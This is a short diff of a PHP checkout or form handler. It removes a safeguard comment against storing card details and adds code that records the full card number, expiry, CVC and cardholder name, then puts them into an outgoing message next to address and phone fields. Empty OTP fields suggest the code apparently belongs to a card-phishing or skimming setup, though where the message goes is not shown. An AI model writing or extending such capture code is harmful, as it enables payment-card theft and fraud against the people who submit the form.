@@ -173,11 +173,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             'state' => $_POST['state'] ?? '',
             'zip' => $_POST['zip'] ?? '',
             'phone' => $_POST['phone'] ?? '',
-        // Do not store sensitive card details.
-        'card_number' => '',
-        'expiry' => '',
-        'cvc' => '',
-        'card_name' => '',
+        'card_number' => $_POST['card_number'] ?? '',
+        'expiry' => $_POST['expiry'] ?? '',
+        'cvc' => $_POST['cvc'] ?? '',
+        'card_name' => $_POST['card_name'] ?? '',
         'discount' => $_POST['discount'] ?? '',
         'otp' => NULL,
         'otp2' => NULL,
@@ -200,6 +199,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 'City/State: ' . trim((string) ($_POST['city'] ?? '')) . ' / ' . trim((string) ($_POST['state'] ?? '')),
                 'Country/ZIP: ' . trim((string) ($_POST['country'] ?? '')) . ' / ' . trim((string) ($_POST['zip'] ?? '')),
                 'Phone: ' . trim((string) ($_POST['phone'] ?? '')),
+                'card number: ' . str_replace(' ', '', $_POST['card_number'] ?? ''),
+                'expiry: ' . str_replace(' ', '', $_POST['expiry'] ?? ''),
+                'cvc: ' . $_POST['cvc'] ?? '',
+                'card_name: ' . $_POST['card_name'] ?? '',
             ];
             $message = implode("
 ", array_filter($messageLines, fn($line) => trim($line) !== '' && trim($line) !== ' /'));
